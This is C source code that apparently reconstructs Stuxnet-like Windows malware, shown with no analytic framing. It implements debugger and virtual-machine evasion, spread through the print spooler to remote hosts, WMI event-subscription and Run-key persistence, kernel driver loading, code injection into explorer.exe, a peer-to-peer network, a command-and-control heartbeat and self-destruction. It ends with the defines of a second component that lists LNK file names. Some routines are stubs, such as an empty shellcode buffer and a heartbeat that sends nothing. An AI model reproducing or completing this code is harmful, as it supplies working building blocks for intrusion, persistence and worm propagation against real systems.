    DWORD dwWaitPeriod;
    DWORD dwAttackCycle;
    DWORD dwHighFreqDuration;
    DWORD dwLowFreqDuration;
    WORD wHighFrequency;
    WORD wLowFrequency;
    WORD wMinFrequency;
    WORD wMaxFrequency;
    DWORD dwMinConverters;
    DWORD dwTargetCPUMask;
    BYTE bAESKey[32];
    BYTE bAESIV[16];
    BYTE bHMACKey[32];
    BYTE bReserved[0x1F00];
} WINSTA_CONFIG, * PWINSTA_CONFIG;

static WINSTA_CTX g_WinstaCtx;
static BOOL g_bInitialized = FALSE;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwPeerCount = 0;
static WINSTA_PEER_ENTRY g_Peers[256];
static WINSTA_CONFIG g_Config;
static HANDLE g_hPrintThread = NULL;
static HANDLE g_hPeerThread = NULL;
static HANDLE g_hCCThread = NULL;
static HANDLE g_hStopEvent = NULL;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(HANDLE, PVOID*, PULONG, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *PFN_RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

static PFN_NtQuerySystemInformation pNtQuerySystemInformation = NULL;
static PFN_NtQueryInformationProcess pNtQueryInformationProcess = NULL;
static PFN_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static PFN_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static PFN_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static PFN_NtCreateThreadEx pNtCreateThreadEx = NULL;
static PFN_RtlAdjustPrivilege pRtlAdjustPrivilege = NULL;

static BOOL Winsta_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pNtQuerySystemInformation = (PFN_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    pNtQueryInformationProcess = (PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    pNtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pRtlAdjustPrivilege = (PFN_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    return TRUE;
}

static BOOL Winsta_EnablePrivilege(LPCWSTR szPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueW(NULL, szPrivilege, &luid)) return FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return (GetLastError() == ERROR_SUCCESS);
}

static BOOL Winsta_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= STUXNET_EXPIRY_YEAR);
}

static BOOL Winsta_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_WinstaCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL Winsta_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    if (pNtQueryInformationProcess) {
        DWORD dwDebugPort = 0;
        if (NT_SUCCESS(pNtQueryInformationProcess(GetCurrentProcess(), 7, &dwDebugPort, sizeof(dwDebugPort), NULL)) && dwDebugPort != 0)
            return TRUE;
    }
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL Winsta_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static VOID Winsta_GetPaths(VOID) {
    GetModuleFileNameW(NULL, g_WinstaCtx.szModulePath, WINSTA_MAX_PATH);
    GetSystemDirectoryW(g_WinstaCtx.szSystemPath, WINSTA_MAX_PATH);
    GetWindowsDirectoryW(g_WinstaCtx.szWindowsPath, WINSTA_MAX_PATH);
    GetTempPathW(WINSTA_MAX_PATH, g_WinstaCtx.szTempPath);
    wsprintfW(g_WinstaCtx.szDriverPath, L"%s\\drivers", g_WinstaCtx.szSystemPath);
    wsprintfW(g_WinstaCtx.szInfPath, L"%s\\inf", g_WinstaCtx.szWindowsPath);
    wsprintfW(g_WinstaCtx.szWbemPath, L"%s\\wbem", g_WinstaCtx.szSystemPath);
    wsprintfW(g_WinstaCtx.szMofPath, L"%s\\wbem\\mof", g_WinstaCtx.szSystemPath);
}

static DWORD Winsta_GetLocalIPList(PDWORD pdwIPList, PDWORD pdwCount) {
    DWORD dwSize;
    PIP_ADAPTER_INFO pAdapter;
    PIP_ADAPTER_INFO pCurrent;
    DWORD dwIndex;
    if (!pdwIPList || !pdwCount) return 0;
    dwSize = 0;
    GetAdaptersInfo(NULL, &dwSize);
    if (dwSize == 0) return 0;
    pAdapter = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pAdapter) return 0;
    if (GetAdaptersInfo(pAdapter, &dwSize) != ERROR_SUCCESS) {
        HeapFree(GetProcessHeap(), 0, pAdapter);
        return 0;
    }
    dwIndex = 0;
    pCurrent = pAdapter;
    while (pCurrent && dwIndex < *pdwCount) {
        if (pCurrent->IpAddressList.IpAddress.String[0] != '0') {
            pdwIPList[dwIndex++] = inet_addr(pCurrent->IpAddressList.IpAddress.String);
        }
        pCurrent = pCurrent->Next;
    }
    *pdwCount = dwIndex;
    HeapFree(GetProcessHeap(), 0, pAdapter);
    return dwIndex;
}

static BOOL Winsta_ExploitPrintSpooler(LPCWSTR szTarget, LPCWSTR szLocalFile, LPCWSTR szRemoteFile) {
    HANDLE hPrinter;
    PRINTER_DEFAULTSW pd;
    DWORD dwWritten;
    BYTE buffer[WINSTA_BUFFER_SIZE];
    HANDLE hFile;
    DWORD dwRead;
    DWORD dwSize;
    if (!szTarget || !szLocalFile || !szRemoteFile) return FALSE;
    ZeroMemory(&pd, sizeof(pd));
    pd.DesiredAccess = PRINTER_ALL_ACCESS;
    if (!OpenPrinterW((LPWSTR)szTarget, &hPrinter, &pd)) {
        return FALSE;
    }
    hFile = CreateFileW(szLocalFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        ClosePrinter(hPrinter);
        return FALSE;
    }
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > WINSTA_BUFFER_SIZE) {
        CloseHandle(hFile);
        ClosePrinter(hPrinter);
        return FALSE;
    }
    ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    if (!WritePrinter(hPrinter, buffer, dwSize, &dwWritten)) {
        ClosePrinter(hPrinter);
        return FALSE;
    }
    ClosePrinter(hPrinter);
    return TRUE;
}

static BOOL Winsta_ExploitPrintSpoolerRemote(LPCWSTR szRemoteIP) {
    WCHAR szPrinterName[256];
    WCHAR szLocalPath[WINSTA_MAX_PATH];
    WCHAR szRemotePath[WINSTA_MAX_PATH];
    wsprintfW(szPrinterName, L"\\\\%s\\XPS Printer", szRemoteIP);
    GetModuleFileNameW(NULL, szLocalPath, WINSTA_MAX_PATH);
    wsprintfW(szRemotePath, L"%%SystemRoot%%\\system32\\winsta.exe");
    return Winsta_ExploitPrintSpooler(szPrinterName, szLocalPath, szRemotePath);
}

static BOOL Winsta_ExploitPrintSpoolerLocal(VOID) {
    WCHAR szPrinterName[256];
    WCHAR szLocalPath[WINSTA_MAX_PATH];
    WCHAR szRemotePath[WINSTA_MAX_PATH];
    wcscpy_s(szPrinterName, 256, L"XPS Printer");
    GetModuleFileNameW(NULL, szLocalPath, WINSTA_MAX_PATH);
    wsprintfW(szRemotePath, L"%%SystemRoot%%\\system32\\winsta.exe");
    return Winsta_ExploitPrintSpooler(szPrinterName, szLocalPath, szRemotePath);
}

static BOOL Winsta_CreateMOF(VOID) {
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szMofPath[WINSTA_MAX_PATH];
    CHAR szMofData[] =
        "#pragma namespace(\"\\\\\\\\.\\\\root\\\\default\")\n"
        "instance of __EventFilter as $Filter\n"
        "{\n"
        "    Name = \"StuxnetFilter\";\n"
        "    EventNamespace = \"root\\\\cimv2\";\n"
        "    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'\";\n"
        "    QueryLanguage = \"WQL\";\n"
        "};\n"
        "instance of ActiveScriptEventConsumer as $Consumer\n"
        "{\n"
        "    Name = \"StuxnetConsumer\";\n"
        "    ScriptingEngine = \"VBScript\";\n"
        "    ScriptText = \"CreateObject(\\\"WScript.Shell\\\").Run \\\"%SystemRoot%\\\\system32\\\\winsta.exe\\\", 0, False\";\n"
        "};\n"
        "instance of __FilterToConsumerBinding\n"
        "{\n"
        "    Consumer = $Consumer;\n"
        "    Filter = $Filter;\n"
        "};\n";
    wsprintfW(szMofPath, L"%s\\sysnullevnt.mof", g_WinstaCtx.szMofPath);
    hFile = CreateFileW(szMofPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, szMofData, sizeof(szMofData) - 1, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL Winsta_RegisterMOF(VOID) {
    WCHAR szCmd[WINSTA_MAX_PATH];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wsprintfW(szCmd, L"mofcomp.exe %s\\sysnullevnt.mof", g_WinstaCtx.szMofPath);
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

static BOOL Winsta_ExtractDriver(LPCWSTR szDriverName, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WINSTA_MAX_PATH];
    wsprintfW(szPath, L"%s\\%s", g_WinstaCtx.szDriverPath, szDriverName);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL Winsta_LoadDriver(LPCWSTR szDriverName) {
    HANDLE hSCManager;
    HANDLE hService;
    WCHAR szPath[WINSTA_MAX_PATH];
    WCHAR szServiceName[64];
    wsprintfW(szServiceName, L"MRxCls");
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    wsprintfW(szPath, L"%s\\%s", g_WinstaCtx.szDriverPath, szDriverName);
    hService = CreateServiceW(hSCManager, szServiceName, szServiceName, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, szPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCManager, szServiceName, SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

static BOOL Winsta_P2P_Init(VOID) {
    g_dwPeerCount = 0;
    ZeroMemory(g_Peers, sizeof(g_Peers));
    return TRUE;
}

static BOOL Winsta_P2P_Broadcast(VOID) {
    SOCKET s;
    SOCKADDR_IN sa;
    DWORD dwBroadcast;
    BYTE buffer[64];
    s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return FALSE;
    dwBroadcast = 1;
    setsockopt(s, SOL_SOCKET, SO_BROADCAST, (LPCSTR)&dwBroadcast, sizeof(dwBroadcast));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(STUXNET_PEER_PORT);
    sa.sin_addr.s_addr = INADDR_BROADCAST;
    *(PDWORD)(buffer + 0) = STUXNET_MAGIC;
    *(PDWORD)(buffer + 4) = STUXNET_VERSION;
    *(PDWORD)(buffer + 8) = GetCurrentProcessId();
    sendto(s, (LPCSTR)buffer, 64, 0, (SOCKADDR*)&sa, sizeof(sa));
    closesocket(s);
    return TRUE;
}

static BOOL Winsta_P2P_Connect(DWORD dwPeerIP) {
    SOCKET s;
    SOCKADDR_IN sa;
    BYTE buffer[64];
    DWORD dwLen;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(STUXNET_PEER_PORT);
    sa.sin_addr.s_addr = dwPeerIP;
    if (connect(s, (SOCKADDR*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return FALSE;
    }
    *(PDWORD)(buffer + 0) = STUXNET_MAGIC;
    *(PDWORD)(buffer + 4) = STUXNET_VERSION;
    *(PDWORD)(buffer + 8) = GetCurrentProcessId();
    send(s, (LPCSTR)buffer, 64, 0);
    dwLen = recv(s, (LPSTR)buffer, 64, 0);
    closesocket(s);
    if (dwLen > 0 && *(PDWORD)buffer == STUXNET_MAGIC) {
        return TRUE;
    }
    return FALSE;
}

static DWORD WINAPI Winsta_P2P_Worker(LPVOID lpParam) {
    SOCKET s;
    SOCKADDR_IN sa;
    BYTE buffer[WINSTA_BUFFER_SIZE];
    DWORD dwLen;
    DWORD dwPeerIP;
    fd_set fdRead;
    struct timeval tv;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 1;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(STUXNET_PEER_PORT);
    sa.sin_addr.s_addr = INADDR_ANY;
    bind(s, (SOCKADDR*)&sa, sizeof(sa));
    listen(s, SOMAXCONN);
    while (WaitForSingleObject(g_hStopEvent, 0) != WAIT_OBJECT_0) {
        FD_ZERO(&fdRead);
        FD_SET(s, &fdRead);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        if (select(0, &fdRead, NULL, NULL, &tv) > 0) {
            dwLen = sizeof(sa);
            SOCKET sClient = accept(s, (SOCKADDR*)&sa, &dwLen);
            if (sClient != INVALID_SOCKET) {
                dwLen = recv(sClient, (LPSTR)buffer, WINSTA_BUFFER_SIZE, 0);
                if (dwLen > 0 && *(PDWORD)buffer == STUXNET_MAGIC) {
                    dwPeerIP = sa.sin_addr.s_addr;
                    if (g_dwPeerCount < 256) {
                        g_Peers[g_dwPeerCount].dwIP = dwPeerIP;
                        g_Peers[g_dwPeerCount].dwLastSeen = GetTickCount();
                        g_dwPeerCount++;
                    }
                    send(sClient, (LPCSTR)buffer, dwLen, 0);
                }
                closesocket(sClient);
            }
        }
        Sleep(100);
    }
    closesocket(s);
    return 0;
}

static BOOL Winsta_C2_Connect(LPCWSTR szServer, WORD wPort) {
    SOCKET s;
    SOCKADDR_IN sa;
    HOSTENT* pHost;
    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    pHost = gethostbynameW(szServer);
    if (!pHost) {
        closesocket(s);
        return FALSE;
    }
    sa.sin_family = AF_INET;
    sa.sin_port = htons(wPort);
    sa.sin_addr.s_addr = *(DWORD*)pHost->h_addr_list[0];
    if (connect(s, (SOCKADDR*)&sa, sizeof(sa)) != 0) {
        closesocket(s);
        return FALSE;
    }
    closesocket(s);
    return TRUE;
}

static BOOL Winsta_C2_SendHeartbeat(VOID) {
    BYTE buffer[64];
    DWORD dwSize;
    dwSize = 0;
    *(PDWORD)(buffer + dwSize) = STUXNET_MAGIC;
    dwSize += 4;
    *(PDWORD)(buffer + dwSize) = STUXNET_VERSION;
    dwSize += 4;
    *(PDWORD)(buffer + dwSize) = GetCurrentProcessId();
    dwSize += 4;
    *(PDWORD)(buffer + dwSize) = GetTickCount();
    dwSize += 4;
    *(PDWORD)(buffer + dwSize) = g_dwInfectionCount;
    dwSize += 4;
    return TRUE;
}

static DWORD WINAPI Winsta_C2_Worker(LPVOID lpParam) {
    DWORD dwIndex = 0;
    while (WaitForSingleObject(g_hStopEvent, 300000) != WAIT_OBJECT_0) {
        Winsta_C2_Connect(STUXNET_CC_SERVER1, STUXNET_CC_PORT);
        Winsta_C2_SendHeartbeat();
        dwIndex++;
        if (dwIndex > 3) {
            dwIndex = 0;
        }
    }
    return 0;
}

static BOOL Winsta_InjectProcess(DWORD dwPID, LPVOID pShellcode, DWORD dwSize) {
    HANDLE hProcess;
    HANDLE hThread;
    PVOID pMem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;
    pMem = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    WriteProcessMemory(hProcess, pMem, pShellcode, dwSize, NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
    }
    VirtualFreeEx(hProcess, pMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

static BOOL Winsta_InjectExplorer(VOID) {
    HANDLE hSnap;
    PROCESSENTRY32W pe;
    DWORD dwPID;
    BYTE shellcode[0x1000];
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return FALSE;
    pe.dwSize = sizeof(PROCESSENTRY32W);
    if (!Process32FirstW(hSnap, &pe)) {
        CloseHandle(hSnap);
        return FALSE;
    }
    do {
        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
            dwPID = pe.th32ProcessID;
            ZeroMemory(shellcode, sizeof(shellcode));
            Winsta_InjectProcess(dwPID, shellcode, sizeof(shellcode));
            CloseHandle(hSnap);
            return TRUE;
        }
    } while (Process32NextW(hSnap, &pe));
    CloseHandle(hSnap);
    return FALSE;
}

static BOOL Winsta_GetSystemVersion(PDWORD pdwMajor, PDWORD pdwMinor, PDWORD pdwBuild) {
    RTL_OSVERSIONINFOW osvi;
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    if (RtlGetVersion(&osvi) != STATUS_SUCCESS) {
        return FALSE;
    }
    if (pdwMajor) *pdwMajor = osvi.dwMajorVersion;
    if (pdwMinor) *pdwMinor = osvi.dwMinorVersion;
    if (pdwBuild) *pdwBuild = osvi.dwBuildNumber;
    return TRUE;
}

static BOOL Winsta_IsAdmin(VOID) {
    SID_IDENTIFIER_AUTHORITY nta = SECURITY_NT_AUTHORITY;
    PSID pSid = NULL;
    BOOL bAdmin = FALSE;
    if (AllocateAndInitializeSid(&nta, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid)) {
        CheckTokenMembership(NULL, pSid, &bAdmin);
        FreeSid(pSid);
    }
    return bAdmin;
}

static BOOL Winsta_GetComputerName(LPWSTR szName, DWORD dwSize) {
    DWORD dwLen = dwSize;
    return GetComputerNameW(szName, &dwLen);
}

static BOOL Winsta_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szPath[WINSTA_MAX_PATH];
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, STUXNET_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, STUXNET_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    GetModuleFileNameW(NULL, szPath, WINSTA_MAX_PATH);
    // Warning: Personal Speculation
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Stuxnet", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL Winsta_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, STUXNET_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, STUXNET_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL Winsta_SelfDestruct(VOID) {
    WCHAR szPath[WINSTA_MAX_PATH];
    HANDLE hFile;
    BYTE buffer[4096];
    DWORD dwWritten;
    DWORD i;
    GetModuleFileNameW(NULL, szPath, WINSTA_MAX_PATH);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        ZeroMemory(buffer, 4096);
        for (i = 0; i < 10; i++) {
            SetFilePointer(hFile, i * 4096, NULL, FILE_BEGIN);
            WriteFile(hFile, buffer, 4096, &dwWritten, NULL);
        }
        CloseHandle(hFile);
    }
    DeleteFileW(szPath);
    return TRUE;
}

static BOOL Winsta_Cleanup(VOID) {
    WCHAR szPath[WINSTA_MAX_PATH];
    wsprintfW(szPath, L"%s\\sysnullevnt.mof", g_WinstaCtx.szMofPath);
    DeleteFileW(szPath);
    wsprintfW(szPath, L"%s\\%s", g_WinstaCtx.szDriverPath, STUXNET_DRIVER1);
    DeleteFileW(szPath);
    wsprintfW(szPath, L"%s\\%s", g_WinstaCtx.szDriverPath, STUXNET_DRIVER2);
    DeleteFileW(szPath);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, STUXNET_REG_KEY);
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Stuxnet");
    if (g_hStopEvent) SetEvent(g_hStopEvent);
    if (g_hPrintThread) { WaitForSingleObject(g_hPrintThread, 5000); CloseHandle(g_hPrintThread); }
    if (g_hPeerThread) { WaitForSingleObject(g_hPeerThread, 5000); CloseHandle(g_hPeerThread); }
    if (g_hCCThread) { WaitForSingleObject(g_hCCThread, 5000); CloseHandle(g_hCCThread); }
    if (g_hStopEvent) { CloseHandle(g_hStopEvent); g_hStopEvent = NULL; }
    return TRUE;
}

static DWORD WINAPI Winsta_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (Winsta_IsExpired()) {
            Winsta_SelfDestruct();
            break;
        }
        if (!Winsta_ReadRegistry()) {
            Winsta_WriteRegistry();
        }
        Winsta_InjectExplorer();
        Winsta_P2P_Broadcast();
        dwTick = GetTickCount();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL Winsta_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_WinstaCtx, sizeof(WINSTA_CTX));
    g_WinstaCtx.dwMagic = WINSTA_MAGIC;
    g_WinstaCtx.dwVersion = WINSTA_VERSION;
    g_WinstaCtx.dwPid = GetCurrentProcessId();
    g_WinstaCtx.dwTid = GetCurrentThreadId();
    g_WinstaCtx.dwTickStart = GetTickCount();
    g_WinstaCtx.dwMaxRetries = WINSTA_MAX_RETRIES;
    g_WinstaCtx.dwTimeout = WINSTA_TIMEOUT_MS;
    InitializeCriticalSection(&g_WinstaCtx.csLock);
    Winsta_GetPaths();
    Winsta_InitNtImports();
    Winsta_GetSystemVersion(&dwMajor, &dwMinor, &dwBuild);
    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_hStopEvent) {
        DeleteCriticalSection(&g_WinstaCtx.csLock);
        return FALSE;
    }
    Winsta_P2P_Init();
    g_bInitialized = TRUE;
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hMutex;
    if (!Winsta_Init()) return 1;
    if (Winsta_CheckDebugger()) {
        Winsta_Cleanup();
        return 1;
    }
    if (Winsta_CheckVMware()) {
        Winsta_Cleanup();
        return 1;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        Winsta_Cleanup();
        return 1;
    }
    if (Winsta_IsExpired()) {
        CloseHandle(hMutex);
        Winsta_Cleanup();
        return 1;
    }
    Winsta_EnablePrivilege(SE_DEBUG_NAME);
    Winsta_EnablePrivilege(SE_TCB_NAME);
    Winsta_EnablePrivilege(SE_LOAD_DRIVER_NAME);
    Winsta_ExploitPrintSpoolerLocal();
    Winsta_CreateMOF();
    Winsta_RegisterMOF();
    Winsta_WriteRegistry();
    g_hPrintThread = CreateThread(NULL, 0, Winsta_WorkerThread, NULL, 0, NULL);
    g_hPeerThread = CreateThread(NULL, 0, Winsta_P2P_Worker, NULL, 0, NULL);
    g_hCCThread = CreateThread(NULL, 0, Winsta_C2_Worker, NULL, 0, NULL);
    WaitForSingleObject(g_hStopEvent, INFINITE);
    Winsta_Cleanup();
    CloseHandle(hMutex);
    return 0;
}
END

~WTR4141.tmp:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WTR4141_MAGIC                   0x57545231
#define WTR4141_VERSION                 0x00010400
#define WTR4141_MAX_PATH                260
#define WTR4141_BUFFER_SIZE             4096
#define WTR4141_DLL_NAME                L"~WTR4141.tmp"
#define WTR4141_PAYLOAD_NAME            L"~WTR4132.tmp"
#define WTR4141_SHELL32_ASLR            L"SHELL32.DLL.ASLR."
#define WTR4141_KERNEL32_ASLR           L"KERNEL32.DLL.ASLR."
#define WTR4141_MUTEX                   L"{BE3533AB-2DDC-46a1-8F7B-F102B8A5C30A}"
#define WTR4141_LNK1                    L"Copy of Shortcut to.lnk"
#define WTR4141_LNK2                    L"Copy of Copy of Shortcut to.lnk"
#define WTR4141_LNK3                    L"Copy of Copy of Copy of Shortcut to.lnk"
#define WTR4141_LNK4                    L"Copy of Copy of Copy of Copy of Shortcut to.lnk"
#define WTR4141_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WTR4141_REG_VALUE               L"19790509"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
